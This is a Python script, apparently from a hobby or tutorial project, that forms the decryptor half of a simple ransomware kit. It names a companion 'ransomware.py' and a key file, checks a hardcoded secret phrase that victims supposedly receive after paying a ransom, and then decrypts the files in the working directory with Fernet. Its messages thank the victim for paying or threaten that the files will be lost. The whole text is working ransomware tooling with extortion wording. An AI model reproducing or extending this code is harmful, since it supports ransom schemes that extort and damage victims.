
#  ____  ___          ___.                      ____  ___
#  \   \/  /__________\_ |__   ___________  ____\   \/  /
#   \     // __ \_  __ \ __ \_/ __ \_  __ \/  _ \\     / 
#   /     \  ___/|  | \/ \_\ \  ___/|  | \(  <_> )     \ 
#  /___/\  \___  >__|  |___  /\___  >__|   \____/___/\  \
#        \_/   \/          \/     \/                  \_/

# This script decrypts files that were encrypted by the ransomware script.
# It uses the Fernet encryption method from the cryptography library.

import os

from cryptography.fernet import Fernet

# Create an empty list to store the names of encrypted files we want to decrypt.
files = []

# Loop through each file in the current directory.
for file in os.listdir():
    
    # Skip the ransomware script, the encryption key file, and the decryption script itself.
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
        continue

    # Check if the item is a file and not a directory.
    if os.path.isfile(file):
        # Add the file to our list of files to decrypt.
        files.append(file)

# Define a secret phrase required to decrypt the files.
secretphrase = "Dracarys"

# Prompt the user to enter the secret phrase.
userphrase = input("Enter the secret phrase you received after paying the ransom: \n")

# Check if the entered phrase matches the secret phrase.
if userphrase == secretphrase:
    # Load the existing encryption key from the file.
    with open("thekey.key", "rb") as key:
        secretkey = key.read()

    # Loop through each encrypted file to decrypt it.
    for file in files:
        # Open the file in read-binary mode to read its contents.
        with open(file, "rb") as thefile:
            contents = thefile.read()

        # Decrypt the file contents using the loaded encryption key.
        contents_decrypted = Fernet(secretkey).decrypt(contents)

        # Open the file in write-binary mode to overwrite it with the decrypted contents.
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)

    # Inform the user that the files have been successfully decrypted.
    print("Congratulations, your files have been successfully decrypted. Thank you for paying the ransom.")

else:
    # Inform the user that the entered phrase is incorrect and prompt them to pay the ransom.
    print("The secret phrase is incorrect. Pay the ransom to receive the phrase that will decrypt your files, or prepare to lose them.")

# DONE. After running this script, you should have your files back.
